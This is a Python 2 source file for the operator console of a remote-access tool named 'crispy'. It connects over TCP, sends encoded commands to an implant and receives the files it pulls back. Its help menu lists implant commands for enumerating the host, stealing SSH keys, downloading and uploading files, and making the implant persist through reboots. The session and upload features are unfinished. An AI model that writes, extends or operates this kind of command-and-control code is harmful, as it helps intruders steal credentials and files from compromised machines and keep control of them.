import os
import socket
import sys

from crispy.encoders.mime import Mime

BUFFER_SIZE = 1024
TCP_IP, TCP_PORT = "localhost", 8080
PROMPT = "%s:%i>> " % (TCP_IP, TCP_PORT)
BANNER = "                                                                     \n \
     ___           ___                       ___           ___                 \n \
    /  /\         /  /\        ___          /  /\         /  /\         ___    \n \
   /  /:/        /  /::\      /  /\        /  /:/_       /  /::\      /__/|    \n \
  /  /:/        /  /:/\:\    /  /:/       /  /:/ /\     /  /:/\:\    |  |:|    \n \
 /  /:/  ___   /  /:/~/:/   /__/::\      /  /:/ /::\   /  /:/~/:/    |  |:|    \n \
/__/:/  /  /\ /__/:/ /:/___ \__\/\:\__  /__/:/ /:/\:\ /__/:/ /:/   __|__|:|    \n \
\  \:\ /  /:/ \  \:\/:::::/    \  \:\/\ \  \:\/:/~/:/ \  \:\/:/   /__/::::\    \n \
 \  \:\  /:/   \  \::/~~~~      \__\::/  \  \::/ /:/   \  \::/       ~\~~\:\   \n \
  \  \:\/:/     \  \:\          /__/:/    \__\/ /:/     \  \:\         \  \:\  \n \
   \  \::/       \  \:\         \__\/       /__/:/       \  \:\         \__\/  \n \
    \__\/         \__\/                     \__\/         \__\/                \n\n"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cipher = Mime()
    
def help_menu():
    info = """
    Remote commands:
        enum_os            - get operating system info
        enum_applications  - get a list of installed applications
        enum_drives        - get a list of drives
        enum_printers      - get a list of printers
        get_ssh_keys       - get any ssh keys
        download           - download [src absolute path] [dest absolute path]
        upload             - upload [src absolute path] [dest absolute path]
        enable_persistence - make implant persistent through reboots
    Local commands:
        session            - show current session
        exit               - close down connection to remote host
    """
     
    return info
 
def get_session_info():
    # show length of connection
    # show remote ip and port connected to
    return "need to implement once bind/reverse conn is figured out"

def receiveFile(downFile):
    if os.path.isfile(downFile):
        return False 
    else:   
        try:
            f = open(downFile, 'wb')
             
            while True:
                data = sock.recv(BUFFER_SIZE)
                 
                if not data:
                    break
                elif data == "EOF!EOF!": 
                    f.write(data[:-6])
                    break
                else:
                    f.write(data)
             
            f.close()
            return True
        except IOError: 
            return False

try:
    sock.connect((TCP_IP, TCP_PORT))
    print BANNER
    
    while True:
        cmd = raw_input(PROMPT).strip()
         
        if cmd == '-h' or cmd == 'help':
            print help_menu()
        elif cmd == 'session':
            print get_session_info()
        elif cmd.startswith('download'):
            print "[+] Downloading " + cmd[9:].split(' ')[0] + "..."
            sock.sendall(cipher.encode(cmd + "\n"))
            print 'sent command...'
            
            if receiveFile(cmd[9:].split(' ')[1]):
                print "\tFile transfer complete!\n"
            else:
                print "[!] File transfer failed\n"
        elif cmd == 'upload':
            #rf = cmd[7:].split(' ')[0]
            pass
        elif cmd == 'exit' or cmd == 'quit':
            sock.shutdown('SHUT_WR')
            sock.close()
            break
        else:
            sock.sendall(cipher.encode(cmd + "\n"))
            data = cipher.decode(sock.recv(BUFFER_SIZE))
            print data
except:
    print "Couldn't connect to " + TCP_IP
finally:
    sys.exit(0)